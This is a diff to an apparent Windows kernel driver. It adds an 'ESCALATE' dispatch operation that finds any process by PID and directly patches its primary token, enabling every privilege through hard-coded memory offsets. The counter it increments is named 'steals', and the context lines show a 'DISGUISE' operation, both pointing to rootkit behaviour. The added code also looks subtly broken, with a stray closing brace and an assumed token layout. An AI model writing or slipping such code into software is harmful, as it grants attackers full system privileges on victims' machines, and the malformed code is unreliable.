@@ -925,7 +925,7 @@ NTSTATUS yghv_proc_dispatch(const void *in, ULONG in_len,
      * afterwards is zero and every call silently becomes a snapshot.
      */
     RtlCopyMemory(&r, in, sizeof(r));
-    if (r.op > YGHV_PROC_OP_DISGUISE) return STATUS_INVALID_PARAMETER;
+    if (r.op > YGHV_PROC_OP_ESCALATE) return STATUS_INVALID_PARAMETER;
 
     InterlockedIncrement64(&g_proc_ops);
 
@@ -1077,6 +1077,39 @@ NTSTATUS yghv_proc_dispatch(const void *in, ULONG in_len,
         ObDereferenceObject(proc);
         break;
     }
+    }
+
+    case YGHV_PROC_OP_ESCALATE: {
+        PEPROCESS proc = NULL;
+        PVOID tok = NULL;
+        NTSTATUS est;
+        ULONG i;
+        if (r.pid == 0) { st = STATUS_INVALID_PARAMETER; break; }
+        est = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)r.pid, &proc);
+        if (!NT_SUCCESS(est)) { st = est; break; }
+        tok = PsReferencePrimaryToken(proc);
+        if (!tok) { ObDereferenceObject(proc); st = STATUS_UNSUCCESSFUL; break; }
+        {
+            UCHAR *tokbase = (UCHAR *)tok;
+            ULONG privCount = 0, enabled = 0;
+            UCHAR *privArray;
+            if (!tokbase) { PsDereferencePrimaryToken(tok); ObDereferenceObject(proc); st = STATUS_UNSUCCESSFUL; break; }
+            privCount = *(ULONG *)(tokbase + 0x38);
+            privArray = tokbase + 0x40;
+            if (privCount > 0 && privCount < 128) {
+                for (i = 0; i < privCount; i++) {
+                    ULONG *attr = (ULONG *)(privArray + i * 16 + 8);
+                    *attr |= 0x2;
+                    enabled++;
+                }
+            }
+            o[0] = 1; o[1] = enabled; o[2] = privCount; o[3] = 0;
+            InterlockedIncrement64(&g_proc_steals);
+            st = STATUS_SUCCESS;
+        }
+        PsDereferencePrimaryToken(tok);
+        ObDereferenceObject(proc);
+        break;
     }
 
     default:
